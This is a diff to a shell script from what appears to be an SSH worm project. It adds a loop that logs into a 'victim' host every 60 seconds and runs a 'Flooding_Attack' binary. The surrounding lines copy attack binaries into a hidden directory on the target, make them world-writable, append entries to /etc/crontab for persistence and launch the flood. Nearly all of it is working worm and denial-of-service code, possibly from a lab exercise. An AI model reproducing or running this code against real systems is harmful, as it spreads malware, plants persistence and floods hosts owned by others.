@@ -15,6 +15,8 @@ then
 	(
 	echo "\r"
 	sleep 1
+	echo "y\r"
+	sleep 1
 	echo "\r"
 	sleep 1
 	echo "\r"
@@ -37,6 +39,14 @@ echo "qq1"
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; mkdir -p $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2; chmod 777 $Hidden2 > /dev/null 2>&1'
 echo "qq2"
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab; cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
+while [ 1 = 1 ]
+do
+	ssh victim@"$IP_Address" 'cd "$Hidden2" && ./Flooding_Attack'
+	sleep 60
+done
+
+
+
 echo "qq3"
 
 
